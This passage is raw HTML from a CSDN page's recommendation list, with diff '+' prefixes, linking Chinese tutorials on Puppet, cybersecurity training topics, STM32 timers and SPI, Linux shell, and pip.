+				<a href="https://blog.csdn.net/Python_paipai/article/details/144205139" class="tit" target="_blank"  data-report-click='{"ab":"new","spm":"1001.2101.3001.6650.2","mod":"popu_387","extra":"{\"highlightScore\":0.0,\"utm_medium\":\"distribute.pc_relevant.none-task-blog-2~default~BlogOpenSearchComplete~Rate-2-144205139-blog-161020751.235^v43^pc_blog_bottom_relevance_base3\",\"dist_request_id\":\"1779004798791_81523\"}","dist_request_id":"1779004798791_81523","ab_strategy":"landing_bge_commercial_hanlp_download_sign","index":"2","strategy":"2~default~BlogOpenSearchComplete~Rate","dest":"https://blog.csdn.net/Python_paipai/article/details/144205139"}'  data-report-query='spm=1001.2101.3001.6650.2&utm_medium=distribute.pc_relevant.none-task-blog-2%7Edefault%7EBlogOpenSearchComplete%7ERate-2-144205139-blog-161020751.235%5Ev43%5Epc_blog_bottom_relevance_base3&depth_1-utm_source=distribute.pc_relevant.none-task-blog-2%7Edefault%7EBlogOpenSearchComplete%7ERate-2-144205139-blog-161020751.235%5Ev43%5Epc_blog_bottom_relevance_base3'>
+					<div class="left ellipsis-online ellipsis-online-1">Puppet编程入门：详解Puppet安装步骤，零基础入门到精通，收藏这篇就够了</div>
+				</a>
+			</div>
+			<div class="info-box display-flex">
+				<div class="info">
+					<a href="https://blog.csdn.net/Python_paipai" target="_blank"><span class="blog-title">Python_paipai的博客</span></a>
+				</div>
+				<div class="info display-flex">
+					<span class="info-block time">12-03</span>
+					<span class="info-block read"><img class="read-img" src="https://csdnimg.cn/release/blogv2/dist/pc/img/readCountWhite.png" alt="">
+					1373
+					</span>
+				</div>
+			</div>
+		</div>
+		<div class="desc-box">
+			<a href="https://blog.csdn.net/Python_paipai/article/details/144205139" target="_blank"  data-report-click='{"ab":"new","spm":"1001.2101.3001.6650.2","mod":"popu_387","extra":"{\"highlightScore\":0.0,\"utm_medium\":\"distribute.pc_relevant.none-task-blog-2~default~BlogOpenSearchComplete~Rate-2-144205139-blog-161020751.235^v43^pc_blog_bottom_relevance_base3\",\"dist_request_id\":\"1779004798791_81523\"}","dist_request_id":"1779004798791_81523","ab_strategy":"landing_bge_commercial_hanlp_download_sign","index":"2","strategy":"2~default~BlogOpenSearchComplete~Rate","dest":"https://blog.csdn.net/Python_paipai/article/details/144205139"}'  data-report-query='spm=1001.2101.3001.6650.2&utm_medium=distribute.pc_relevant.none-task-blog-2%7Edefault%7EBlogOpenSearchComplete%7ERate-2-144205139-blog-161020751.235%5Ev43%5Epc_blog_bottom_relevance_base3&depth_1-utm_source=distribute.pc_relevant.none-task-blog-2%7Edefault%7EBlogOpenSearchComplete%7ERate-2-144205139-blog-161020751.235%5Ev43%5Epc_blog_bottom_relevance_base3'>
+				<div class="desc ellipsis-online ellipsis-online-1">通过本文的详细<em>讲解</em>，相信您已经掌握了Puppet的安装方法。接下来，您可以进一步学习Puppet的配置和使用，提升您的DevOps技能。</div>
+			</a>
+		</div>
+	</div>
+</div>
+<div class="recommend-item-box type_blog clearfix" data-url="https://blog.csdn.net/Python_paipai/article/details/143239144"  data-report-view='{"ab":"new","spm":"1001.2101.3001.6650.3","mod":"popu_387","extra":"{\"highlightScore\":0.0,\"utm_medium\":\"distribute.pc_relevant.none-task-blog-2~default~BlogOpenSearchComplete~Rate-3-143239144-blog-161020751.235^v43^pc_blog_bottom_relevance_base3\",\"dist_request_id\":\"1779004798791_81523\"}","dist_request_id":"1779004798791_81523","ab_strategy":"landing_bge_commercial_hanlp_download_sign","index":"3","strategy":"2~default~BlogOpenSearchComplete~Rate","dest":"https://blog.csdn.net/Python_paipai/article/details/143239144"}'>
+	<div class="content-box">
+		<div class="content-blog display-flex">
+			<div class="title-box">
+				<a href="https://blog.csdn.net/Python_paipai/article/details/143239144" class="tit" target="_blank"  data-report-click='{"ab":"new","spm":"1001.2101.3001.6650.3","mod":"popu_387","extra":"{\"highlightScore\":0.0,\"utm_medium\":\"distribute.pc_relevant.none-task-blog-2~default~BlogOpenSearchComplete~Rate-3-143239144-blog-161020751.235^v43^pc_blog_bottom_relevance_base3\",\"dist_request_id\":\"1779004798791_81523\"}","dist_request_id":"1779004798791_81523","ab_strategy":"landing_bge_commercial_hanlp_download_sign","index":"3","strategy":"2~default~BlogOpenSearchComplete~Rate","dest":"https://blog.csdn.net/Python_paipai/article/details/143239144"}'  data-report-query='spm=1001.2101.3001.6650.3&utm_medium=distribute.pc_relevant.none-task-blog-2%7Edefault%7EBlogOpenSearchComplete%7ERate-3-143239144-blog-161020751.235%5Ev43%5Epc_blog_bottom_relevance_base3&depth_1-utm_source=distribute.pc_relevant.none-task-blog-2%7Edefault%7EBlogOpenSearchComplete%7ERate-3-143239144-blog-161020751.235%5Ev43%5Epc_blog_bottom_relevance_base3'>
+					<div class="left ellipsis-online ellipsis-online-1">网络安全培训指南（非常详细），网络安全零基础入门到精通，收藏这篇就够了</div>
+				</a>
+			</div>
+			<div class="info-box display-flex">
+				<div class="info">
+					<a href="https://blog.csdn.net/Python_paipai" target="_blank"><span class="blog-title">Python_paipai的博客</span></a>
+				</div>
+				<div class="info display-flex">
+					<span class="info-block time">10-25</span>
+					<span class="info-block read"><img class="read-img" src="https://csdnimg.cn/release/blogv2/dist/pc/img/readCountWhite.png" alt="">
+					1172
+					</span>
+				</div>
+			</div>
+		</div>
+		<div class="desc-box">
+			<a href="https://blog.csdn.net/Python_paipai/article/details/143239144" target="_blank"  data-report-click='{"ab":"new","spm":"1001.2101.3001.6650.3","mod":"popu_387","extra":"{\"highlightScore\":0.0,\"utm_medium\":\"distribute.pc_relevant.none-task-blog-2~default~BlogOpenSearchComplete~Rate-3-143239144-blog-161020751.235^v43^pc_blog_bottom_relevance_base3\",\"dist_request_id\":\"1779004798791_81523\"}","dist_request_id":"1779004798791_81523","ab_strategy":"landing_bge_commercial_hanlp_download_sign","index":"3","strategy":"2~default~BlogOpenSearchComplete~Rate","dest":"https://blog.csdn.net/Python_paipai/article/details/143239144"}'  data-report-query='spm=1001.2101.3001.6650.3&utm_medium=distribute.pc_relevant.none-task-blog-2%7Edefault%7EBlogOpenSearchComplete%7ERate-3-143239144-blog-161020751.235%5Ev43%5Epc_blog_bottom_relevance_base3&depth_1-utm_source=distribute.pc_relevant.none-task-blog-2%7Edefault%7EBlogOpenSearchComplete%7ERate-3-143239144-blog-161020751.235%5Ev43%5Epc_blog_bottom_relevance_base3'>
+				<div class="desc ellipsis-online ellipsis-online-1">从网络安全专业学习的主要内容来看，包括<em>linux</em>运维、Python开发、渗透测试、代码审计、等<em>级</em>保护、应急响应、风险评估等。①就业环境：网络安全可以在计算机科学与技术、信息通信、电子商务、互联网金融、电子政务等领域从事相关工作，还可以在政府机关事业单位、银行、保险、证券等金融机构，电信、传媒等行业从事相关工作。内容概要：包括 内网、操作系统、协议、渗透测试、安服、漏洞、注入、XSS、CSRF、SSRF、文件上传、文件下载、文件包含、XXE、逻辑漏洞、工具、SQLmap、NMAP、BP、MSF&hellip;</div>
+			</a>
+		</div>
+	</div>
+</div>
+		<dl id="recommend-item-box-tow" class="recommend-item-box type_blog clearfix">
+			
+		</dl>
+<div class="recommend-item-box type_download clearfix" data-url="https://download.csdn.net/download/dashi00258/92512650"  data-report-view='{"ab":"new","spm":"1001.2101.3001.6650.4","mod":"popu_387","extra":"{\"highlightScore\":0.0,\"utm_medium\":\"distribute.pc_relevant.none-task-download-2~default~OPENSEARCH~Rate-4-92512650-blog-161020751.235^v43^pc_blog_bottom_relevance_base3\",\"dist_request_id\":\"1779004798791_81523\"}","dist_request_id":"1779004798791_81523","ab_strategy":"landing_bge_commercial_hanlp_download_sign","index":"4","strategy":"2~default~OPENSEARCH~Rate","dest":"https://download.csdn.net/download/dashi00258/92512650"}'>
+	<div class="content-box">
+		<div class="content-blog display-flex">
+			<div class="title-box">
+				<a href="https://download.csdn.net/download/dashi00258/92512650" class="tit" target="_blank"  data-report-click='{"ab":"new","spm":"1001.2101.3001.6650.4","mod":"popu_387","extra":"{\"highlightScore\":0.0,\"utm_medium\":\"distribute.pc_relevant.none-task-download-2~default~OPENSEARCH~Rate-4-92512650-blog-161020751.235^v43^pc_blog_bottom_relevance_base3\",\"dist_request_id\":\"1779004798791_81523\"}","dist_request_id":"1779004798791_81523","ab_strategy":"landing_bge_commercial_hanlp_download_sign","index":"4","strategy":"2~default~OPENSEARCH~Rate","dest":"https://download.csdn.net/download/dashi00258/92512650"}'  data-report-query='spm=1001.2101.3001.6650.4&utm_medium=distribute.pc_relevant.none-task-download-2%7Edefault%7EOPENSEARCH%7ERate-4-92512650-blog-161020751.235%5Ev43%5Epc_blog_bottom_relevance_base3&depth_1-utm_source=distribute.pc_relevant.none-task-download-2%7Edefault%7EOPENSEARCH%7ERate-4-92512650-blog-161020751.235%5Ev43%5Epc_blog_bottom_relevance_base3'>
+					<div class="left ellipsis-online ellipsis-online-1">手写滴答定时器教程（<em>保姆</em><em>级</em><em>讲解</em>）- 2020.3.25</div>
+				</a>
+			</div>
+			<div class="info-box display-flex">
+				<div class="info display-flex">
+					<span class="info-block">12-29</span>
+				</div>
+			</div>
+		</div>
+		<div class="desc-box">
+			<a href="https://download.csdn.net/download/dashi00258/92512650" target="_blank"  data-report-click='{"ab":"new","spm":"1001.2101.3001.6650.4","mod":"popu_387","extra":"{\"highlightScore\":0.0,\"utm_medium\":\"distribute.pc_relevant.none-task-download-2~default~OPENSEARCH~Rate-4-92512650-blog-161020751.235^v43^pc_blog_bottom_relevance_base3\",\"dist_request_id\":\"1779004798791_81523\"}","dist_request_id":"1779004798791_81523","ab_strategy":"landing_bge_commercial_hanlp_download_sign","index":"4","strategy":"2~default~OPENSEARCH~Rate","dest":"https://download.csdn.net/download/dashi00258/92512650"}'  data-report-query='spm=1001.2101.3001.6650.4&utm_medium=distribute.pc_relevant.none-task-download-2%7Edefault%7EOPENSEARCH%7ERate-4-92512650-blog-161020751.235%5Ev43%5Epc_blog_bottom_relevance_base3&depth_1-utm_source=distribute.pc_relevant.none-task-download-2%7Edefault%7EOPENSEARCH%7ERate-4-92512650-blog-161020751.235%5Ev43%5Epc_blog_bottom_relevance_base3'>
+				<div class="desc ellipsis-online ellipsis-online-1">EXTI.c部分#include ext.h#define SYSTICK_E 9/** * @brief 用于SysTick初始化 * @param None * @retval None */void TICK_Init(void){ //<em>1</em>.设置SysTick的时钟频率 SysTick-&gt;CTRL&amp;=~(<em>1</em>&lt;&lt;2); //选择当前时钟为...</div>
+			</a>
+		</div>
+	</div>
+</div>
+<div class="recommend-item-box type_download clearfix" data-url="https://download.csdn.net/download/dns_boom/92549040"  data-report-view='{"ab":"new","spm":"1001.2101.3001.6650.5","mod":"popu_387","extra":"{\"highlightScore\":0.0,\"utm_medium\":\"distribute.pc_relevant.none-task-download-2~default~OPENSEARCH~Rate-5-92549040-blog-161020751.235^v43^pc_blog_bottom_relevance_base3\",\"dist_request_id\":\"1779004798791_81523\"}","dist_request_id":"1779004798791_81523","ab_strategy":"landing_bge_commercial_hanlp_download_sign","index":"5","strategy":"2~default~OPENSEARCH~Rate","dest":"https://download.csdn.net/download/dns_boom/92549040"}'>
+	<div class="content-box">
+		<div class="content-blog display-flex">
+			<div class="title-box">
+				<a href="https://download.csdn.net/download/dns_boom/92549040" class="tit" target="_blank"  data-report-click='{"ab":"new","spm":"1001.2101.3001.6650.5","mod":"popu_387","extra":"{\"highlightScore\":0.0,\"utm_medium\":\"distribute.pc_relevant.none-task-download-2~default~OPENSEARCH~Rate-5-92549040-blog-161020751.235^v43^pc_blog_bottom_relevance_base3\",\"dist_request_id\":\"1779004798791_81523\"}","dist_request_id":"1779004798791_81523","ab_strategy":"landing_bge_commercial_hanlp_download_sign","index":"5","strategy":"2~default~OPENSEARCH~Rate","dest":"https://download.csdn.net/download/dns_boom/92549040"}'  data-report-query='spm=1001.2101.3001.6650.5&utm_medium=distribute.pc_relevant.none-task-download-2%7Edefault%7EOPENSEARCH%7ERate-5-92549040-blog-161020751.235%5Ev43%5Epc_blog_bottom_relevance_base3&depth_1-utm_source=distribute.pc_relevant.none-task-download-2%7Edefault%7EOPENSEARCH%7ERate-5-92549040-blog-161020751.235%5Ev43%5Epc_blog_bottom_relevance_base3'>
+					<div class="left ellipsis-online ellipsis-online-1">手写SPI与FLASH通讯教程（<em>保姆</em><em>级</em><em>讲解</em>）</div>
+				</a>
+			</div>
+			<div class="info-box display-flex">
+				<div class="info display-flex">
+					<span class="info-block">01-09</span>
+				</div>
+			</div>
+		</div>
+		<div class="desc-box">
+			<a href="https://download.csdn.net/download/dns_boom/92549040" target="_blank"  data-report-click='{"ab":"new","spm":"1001.2101.3001.6650.5","mod":"popu_387","extra":"{\"highlightScore\":0.0,\"utm_medium\":\"distribute.pc_relevant.none-task-download-2~default~OPENSEARCH~Rate-5-92549040-blog-161020751.235^v43^pc_blog_bottom_relevance_base3\",\"dist_request_id\":\"1779004798791_81523\"}","dist_request_id":"1779004798791_81523","ab_strategy":"landing_bge_commercial_hanlp_download_sign","index":"5","strategy":"2~default~OPENSEARCH~Rate","dest":"https://download.csdn.net/download/dns_boom/92549040"}'  data-report-query='spm=1001.2101.3001.6650.5&utm_medium=distribute.pc_relevant.none-task-download-2%7Edefault%7EOPENSEARCH%7ERate-5-92549040-blog-161020751.235%5Ev43%5Epc_blog_bottom_relevance_base3&depth_1-utm_source=distribute.pc_relevant.none-task-download-2%7Edefault%7EOPENSEARCH%7ERate-5-92549040-blog-161020751.235%5Ev43%5Epc_blog_bottom_relevance_base3'>
+				<div class="desc ellipsis-online ellipsis-online-1"> 写这篇文章足足肝了我一天时间！ ！ ！ ，不过还算是有点收获，希望这篇文章能够帮助你！ ！...关于SPI协议原理方面的文章嵌入式stm32 复习（工作用）&mdash; SPI协议原理知识 2020....APB<em>1</em>ENR |= <em>1</em> &lt;CRH &amp;= ~(0x0F &lt;CRH</div>
+			</a>
+		</div>
+	</div>
+</div>
+<div class="recommend-item-box type_blog clearfix" data-url="https://catcoder.blog.csdn.net/article/details/158738700"  data-report-view='{"ab":"new","spm":"1001.2101.3001.6650.6","mod":"popu_387","extra":"{\"highlightScore\":0.0,\"utm_medium\":\"distribute.pc_relevant.none-task-blog-2~default~OPENSEARCH~Rate-6-158738700-blog-161020751.235^v43^pc_blog_bottom_relevance_base3\",\"dist_request_id\":\"1779004798791_81523\"}","dist_request_id":"1779004798791_81523","ab_strategy":"landing_bge_commercial_hanlp_download_sign","index":"6","strategy":"2~default~OPENSEARCH~Rate","dest":"https://catcoder.blog.csdn.net/article/details/158738700"}'>
+	<div class="content-box">
+		<div class="content-blog display-flex">
+			<div class="title-box">
+				<a href="https://catcoder.blog.csdn.net/article/details/158738700" class="tit" target="_blank"  data-report-click='{"ab":"new","spm":"1001.2101.3001.6650.6","mod":"popu_387","extra":"{\"highlightScore\":0.0,\"utm_medium\":\"distribute.pc_relevant.none-task-blog-2~default~OPENSEARCH~Rate-6-158738700-blog-161020751.235^v43^pc_blog_bottom_relevance_base3\",\"dist_request_id\":\"1779004798791_81523\"}","dist_request_id":"1779004798791_81523","ab_strategy":"landing_bge_commercial_hanlp_download_sign","index":"6","strategy":"2~default~OPENSEARCH~Rate","dest":"https://catcoder.blog.csdn.net/article/details/158738700"}'  data-report-query='spm=1001.2101.3001.6650.6&utm_medium=distribute.pc_relevant.none-task-blog-2%7Edefault%7EOPENSEARCH%7ERate-6-158738700-blog-161020751.235%5Ev43%5Epc_blog_bottom_relevance_base3&depth_1-utm_source=distribute.pc_relevant.none-task-blog-2%7Edefault%7EOPENSEARCH%7ERate-6-158738700-blog-161020751.235%5Ev43%5Epc_blog_bottom_relevance_base3'>
+					<div class="left ellipsis-online ellipsis-online-1">OpenClaw 智能搜索 Skill 创建：从零到一的<em>保姆</em><em>级</em>图文教程</div>
+					<div class="tag">热门推荐</div>
+				</a>
+			</div>
+			<div class="info-box display-flex">
+				<div class="info">
+					<a href="https://blog.csdn.net/weixin_43178406" target="_blank"><span class="blog-title">weixin_43178406的博客</span></a>
+				</div>
+				<div class="info display-flex">
+					<span class="info-block time">03-11</span>
+					<span class="info-block read"><img class="read-img" src="https://csdnimg.cn/release/blogv2/dist/pc/img/readCountWhite.png" alt="">
+					6万+
+					</span>
+				</div>
+			</div>
+		</div>
+		<div class="desc-box">
+			<a href="https://catcoder.blog.csdn.net/article/details/158738700" target="_blank"  data-report-click='{"ab":"new","spm":"1001.2101.3001.6650.6","mod":"popu_387","extra":"{\"highlightScore\":0.0,\"utm_medium\":\"distribute.pc_relevant.none-task-blog-2~default~OPENSEARCH~Rate-6-158738700-blog-161020751.235^v43^pc_blog_bottom_relevance_base3\",\"dist_request_id\":\"1779004798791_81523\"}","dist_request_id":"1779004798791_81523","ab_strategy":"landing_bge_commercial_hanlp_download_sign","index":"6","strategy":"2~default~OPENSEARCH~Rate","dest":"https://catcoder.blog.csdn.net/article/details/158738700"}'  data-report-query='spm=1001.2101.3001.6650.6&utm_medium=distribute.pc_relevant.none-task-blog-2%7Edefault%7EOPENSEARCH%7ERate-6-158738700-blog-161020751.235%5Ev43%5Epc_blog_bottom_relevance_base3&depth_1-utm_source=distribute.pc_relevant.none-task-blog-2%7Edefault%7EOPENSEARCH%7ERate-6-158738700-blog-161020751.235%5Ev43%5Epc_blog_bottom_relevance_base3'>
+				<div class="desc ellipsis-online ellipsis-online-1">本文主要介绍了OpenClaw 智能搜索 Skill 创建：从零到一的<em>保姆</em><em>级</em>图文教程，希望能对学习使用OpenClaw 的同学们有所帮助。
+
+文章目录
+
+<em>1</em>. 前言
+2. 实战教程</div>
+			</a>
+		</div>
+	</div>
+</div>
+<div class="recommend-item-box type_blog clearfix" data-url="https://blog.csdn.net/m0_57053438/article/details/143886745"  data-report-view='{"ab":"new","spm":"1001.2101.3001.6650.7","mod":"popu_387","extra":"{\"highlightScore\":0.0,\"utm_medium\":\"distribute.pc_relevant.none-task-blog-2~default~BLOGTAG~default-7-143886745-blog-161020751.235^v43^pc_blog_bottom_relevance_base3\",\"dist_request_id\":\"1779004798791_81523\"}","dist_request_id":"1779004798791_81523","ab_strategy":"landing_bge_commercial_hanlp_download_sign","index":"7","strategy":"2~default~BLOGTAG~default","dest":"https://blog.csdn.net/m0_57053438/article/details/143886745"}'>
+	<div class="content-box">
+		<div class="content-blog display-flex">
+			<div class="title-box">
+				<a href="https://blog.csdn.net/m0_57053438/article/details/143886745" class="tit" target="_blank"  data-report-click='{"ab":"new","spm":"1001.2101.3001.6650.7","mod":"popu_387","extra":"{\"highlightScore\":0.0,\"utm_medium\":\"distribute.pc_relevant.none-task-blog-2~default~BLOGTAG~default-7-143886745-blog-161020751.235^v43^pc_blog_bottom_relevance_base3\",\"dist_request_id\":\"1779004798791_81523\"}","dist_request_id":"1779004798791_81523","ab_strategy":"landing_bge_commercial_hanlp_download_sign","index":"7","strategy":"2~default~BLOGTAG~default","dest":"https://blog.csdn.net/m0_57053438/article/details/143886745"}'  data-report-query='spm=1001.2101.3001.6650.7&utm_medium=distribute.pc_relevant.none-task-blog-2%7Edefault%7EBLOGTAG%7Edefault-7-143886745-blog-161020751.235%5Ev43%5Epc_blog_bottom_relevance_base3&depth_1-utm_source=distribute.pc_relevant.none-task-blog-2%7Edefault%7EBLOGTAG%7Edefault-7-143886745-blog-161020751.235%5Ev43%5Epc_blog_bottom_relevance_base3'>
+					<div class="left ellipsis-online ellipsis-online-1"><em>Linux</em> shell 基础知识详解</div>
+				</a>
+			</div>
+			<div class="info-box display-flex">
+				<div class="info">
+					<a href="https://blog.csdn.net/m0_57053438" target="_blank"><span class="blog-title">m0_57053438的博客</span></a>
+				</div>
+				<div class="info display-flex">
+					<span class="info-block time">05-13</span>
+					<span class="info-block read"><img class="read-img" src="https://csdnimg.cn/release/blogv2/dist/pc/img/readCountWhite.png" alt="">
+					437
+					</span>
+				</div>
+			</div>
+		</div>
+		<div class="desc-box">
+			<a href="https://blog.csdn.net/m0_57053438/article/details/143886745" target="_blank"  data-report-click='{"ab":"new","spm":"1001.2101.3001.6650.7","mod":"popu_387","extra":"{\"highlightScore\":0.0,\"utm_medium\":\"distribute.pc_relevant.none-task-blog-2~default~BLOGTAG~default-7-143886745-blog-161020751.235^v43^pc_blog_bottom_relevance_base3\",\"dist_request_id\":\"1779004798791_81523\"}","dist_request_id":"1779004798791_81523","ab_strategy":"landing_bge_commercial_hanlp_download_sign","index":"7","strategy":"2~default~BLOGTAG~default","dest":"https://blog.csdn.net/m0_57053438/article/details/143886745"}'  data-report-query='spm=1001.2101.3001.6650.7&utm_medium=distribute.pc_relevant.none-task-blog-2%7Edefault%7EBLOGTAG%7Edefault-7-143886745-blog-161020751.235%5Ev43%5Epc_blog_bottom_relevance_base3&depth_1-utm_source=distribute.pc_relevant.none-task-blog-2%7Edefault%7EBLOGTAG%7Edefault-7-143886745-blog-161020751.235%5Ev43%5Epc_blog_bottom_relevance_base3'>
+				<div class="desc ellipsis-online ellipsis-online-1">Shell 是 <em>Linux</em> 系统的命令行解释器，充当用户与内核之间的桥梁。它接收用户输入的命令，解析后传递给内核执行，并将结果返回给用户。Shell 不仅是命令交互界面，还支持脚本编程，能够自动化复杂任务。Shell 支持变量存储数据，变量名区分大小写，赋值时无需声明类型。Shell 支持函数定义，提高代码复用性。）将一个命令的输出作为另一个命令的输入。Shell 通过重定向控制数据的流向。Shell 脚本支持流程控制结构。正则表达式用于文本匹配（需配合。</div>
+			</a>
+		</div>
+	</div>
+</div>
+<div class="recommend-item-box type_blog clearfix" data-url="https://blog.csdn.net/lxscxk/article/details/161051765"  data-report-view='{"ab":"new","spm":"1001.2101.3001.6650.8","mod":"popu_387","extra":"{\"highlightScore\":0.0,\"utm_medium\":\"distribute.pc_relevant.none-task-blog-2~default~BLOGTAG~default-8-161051765-blog-161020751.235^v43^pc_blog_bottom_relevance_base3\",\"dist_request_id\":\"1779004798791_81523\"}","dist_request_id":"1779004798791_81523","ab_strategy":"landing_bge_commercial_hanlp_download_sign","index":"8","strategy":"2~default~BLOGTAG~default","dest":"https://blog.csdn.net/lxscxk/article/details/161051765"}'>
+	<div class="content-box">
+		<div class="content-blog display-flex">
+			<div class="title-box">
+				<a href="https://blog.csdn.net/lxscxk/article/details/161051765" class="tit" target="_blank"  data-report-click='{"ab":"new","spm":"1001.2101.3001.6650.8","mod":"popu_387","extra":"{\"highlightScore\":0.0,\"utm_medium\":\"distribute.pc_relevant.none-task-blog-2~default~BLOGTAG~default-8-161051765-blog-161020751.235^v43^pc_blog_bottom_relevance_base3\",\"dist_request_id\":\"1779004798791_81523\"}","dist_request_id":"1779004798791_81523","ab_strategy":"landing_bge_commercial_hanlp_download_sign","index":"8","strategy":"2~default~BLOGTAG~default","dest":"https://blog.csdn.net/lxscxk/article/details/161051765"}'  data-report-query='spm=1001.2101.3001.6650.8&utm_medium=distribute.pc_relevant.none-task-blog-2%7Edefault%7EBLOGTAG%7Edefault-8-161051765-blog-161020751.235%5Ev43%5Epc_blog_bottom_relevance_base3&depth_1-utm_source=distribute.pc_relevant.none-task-blog-2%7Edefault%7EBLOGTAG%7Edefault-8-161051765-blog-161020751.235%5Ev43%5Epc_blog_bottom_relevance_base3'>
+					<div class="left ellipsis-online ellipsis-online-1"><em>Linux</em>数据链路层</div>
+				</a>
+			</div>
+			<div class="info-box display-flex">
+				<div class="info">
+					<a href="https://blog.csdn.net/lxscxk" target="_blank"><span class="blog-title">lxscxk的博客</span></a>
+				</div>
+				<div class="info display-flex">
+					<span class="info-block time">05-13</span>
+					<span class="info-block read"><img class="read-img" src="https://csdnimg.cn/release/blogv2/dist/pc/img/readCountWhite.png" alt="">
+					220
+					</span>
+				</div>
+			</div>
+		</div>
+		<div class="desc-box">
+			<a href="https://blog.csdn.net/lxscxk/article/details/161051765" target="_blank"  data-report-click='{"ab":"new","spm":"1001.2101.3001.6650.8","mod":"popu_387","extra":"{\"highlightScore\":0.0,\"utm_medium\":\"distribute.pc_relevant.none-task-blog-2~default~BLOGTAG~default-8-161051765-blog-161020751.235^v43^pc_blog_bottom_relevance_base3\",\"dist_request_id\":\"1779004798791_81523\"}","dist_request_id":"1779004798791_81523","ab_strategy":"landing_bge_commercial_hanlp_download_sign","index":"8","strategy":"2~default~BLOGTAG~default","dest":"https://blog.csdn.net/lxscxk/article/details/161051765"}'  data-report-query='spm=1001.2101.3001.6650.8&utm_medium=distribute.pc_relevant.none-task-blog-2%7Edefault%7EBLOGTAG%7Edefault-8-161051765-blog-161020751.235%5Ev43%5Epc_blog_bottom_relevance_base3&depth_1-utm_source=distribute.pc_relevant.none-task-blog-2%7Edefault%7EBLOGTAG%7Edefault-8-161051765-blog-161020751.235%5Ev43%5Epc_blog_bottom_relevance_base3'>
+				<div class="desc ellipsis-online ellipsis-online-1">数据链路层协议</div>
+			</a>
+		</div>
+	</div>
+</div>
+<div class="recommend-item-box type_blog clearfix" data-url="https://blog.csdn.net/ASDQWE09876/article/details/161117737"  data-report-view='{"ab":"new","spm":"1001.2101.3001.6650.9","mod":"popu_387","extra":"{\"highlightScore\":0.0,\"utm_medium\":\"distribute.pc_relevant.none-task-blog-2~default~BLOGTAG~default-9-161117737-blog-161020751.235^v43^pc_blog_bottom_relevance_base3\",\"dist_request_id\":\"1779004798791_81523\"}","dist_request_id":"1779004798791_81523","ab_strategy":"landing_bge_commercial_hanlp_download_sign","index":"9","strategy":"2~default~BLOGTAG~default","dest":"https://blog.csdn.net/ASDQWE09876/article/details/161117737"}'>
+	<div class="content-box">
+		<div class="content-blog display-flex">
+			<div class="title-box">
+				<a href="https://blog.csdn.net/ASDQWE09876/article/details/161117737" class="tit" target="_blank"  data-report-click='{"ab":"new","spm":"1001.2101.3001.6650.9","mod":"popu_387","extra":"{\"highlightScore\":0.0,\"utm_medium\":\"distribute.pc_relevant.none-task-blog-2~default~BLOGTAG~default-9-161117737-blog-161020751.235^v43^pc_blog_bottom_relevance_base3\",\"dist_request_id\":\"1779004798791_81523\"}","dist_request_id":"1779004798791_81523","ab_strategy":"landing_bge_commercial_hanlp_download_sign","index":"9","strategy":"2~default~BLOGTAG~default","dest":"https://blog.csdn.net/ASDQWE09876/article/details/161117737"}'  data-report-query='spm=1001.2101.3001.6650.9&utm_medium=distribute.pc_relevant.none-task-blog-2%7Edefault%7EBLOGTAG%7Edefault-9-161117737-blog-161020751.235%5Ev43%5Epc_blog_bottom_relevance_base3&depth_1-utm_source=distribute.pc_relevant.none-task-blog-2%7Edefault%7EBLOGTAG%7Edefault-9-161117737-blog-161020751.235%5Ev43%5Epc_blog_bottom_relevance_base3'>
+					<div class="left ellipsis-online ellipsis-online-1"><em>linux</em>普通用户使用pip安装模块</div>
+				</a>
+			</div>
+			<div class="info-box display-flex">
+				<div class="info">
+					<a href="https://blog.csdn.net/ASDQWE09876" target="_blank"><span class="blog-title">ASDQWE09876的博客</span></a>
+				</div>
+				<div class="info display-flex">
+					<span class="info-block time">05-15</span>
+					<span class="info-block read"><img class="read-img" src="https://csdnimg.cn/release/blogv2/dist/pc/img/readCountWhite.png" alt="">
+					78
+					</span>
+				</div>
+			</div>
+		</div>
+		<div class="desc-box">
+			<a href="https://blog.csdn.net/ASDQWE09876/article/details/161117737" target="_blank"  data-report-click='{"ab":"new","spm":"1001.2101.3001.6650.9","mod":"popu_387","extra":"{\"highlightScore\":0.0,\"utm_medium\":\"distribute.pc_relevant.none-task-blog-2~default~BLOGTAG~default-9-161117737-blog-161020751.235^v43^pc_blog_bottom_relevance_base3\",\"dist_request_id\":\"1779004798791_81523\"}","dist_request_id":"1779004798791_81523","ab_strategy":"landing_bge_commercial_hanlp_download_sign","index":"9","strategy":"2~default~BLOGTAG~default","dest":"https://blog.csdn.net/ASDQWE09876/article/details/161117737"}'  data-report-query='spm=1001.2101.3001.6650.9&utm_medium=distribute.pc_relevant.none-task-blog-2%7Edefault%7EBLOGTAG%7Edefault-9-161117737-blog-161020751.235%5Ev43%5Epc_blog_bottom_relevance_base3&depth_1-utm_source=distribute.pc_relevant.none-task-blog-2%7Edefault%7EBLOGTAG%7Edefault-9-161117737-blog-161020751.235%5Ev43%5Epc_blog_bottom_relevance_base3'>
+				<div class="desc ellipsis-online ellipsis-online-1">执行之后，pyinstaller会被安装到。以安装pyinstaller为例。</div>
+			</a>
+		</div>
+	</div>
+</div>
+<div class="recommend-item-box type_blog clearfix" data-url="https://blog.csdn.net/2503_92775091/article/details/161056659"  data-report-view='{"ab":"new","spm":"1001.2101.3001.6650.10","mod":"popu_387","extra":"{\"highlightScore\":0.0,\"utm_medium\":\"distribute.pc_relevant.none-task-blog-2~default~BLOGTAG~default-10-161056659-blog-161020751.235^v43^pc_blog_bottom_relevance_base3\",\"dist_request_id\":\"1779004798791_81523\"}","dist_request_id":"1779004798791_81523","ab_strategy":"landing_bge_commercial_hanlp_download_sign","index":"10","strategy":"2~default~BLOGTAG~default","dest":"https://blog.csdn.net/2503_92775091/article/details/161056659"}'>
+	<div class="content-box">
+		<div class="content-blog display-flex">
+			<div class="title-box">
